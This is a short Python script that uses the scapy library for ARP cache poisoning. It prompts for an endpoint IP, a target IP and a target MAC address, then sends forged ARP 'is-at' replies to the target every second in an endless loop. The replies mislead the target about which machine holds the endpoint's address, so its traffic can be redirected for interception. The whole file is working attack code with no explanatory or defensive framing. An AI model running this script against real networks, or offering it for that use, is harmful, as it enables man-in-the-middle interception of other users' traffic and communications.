from scapy.all import *
import time

endpointIP = input("The endpoint's IP address : ")
targetIP = input("The target's IP address : ")
targetMAC = input("The target's MAC address : ")

while True:
    sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
    time.sleep(1)
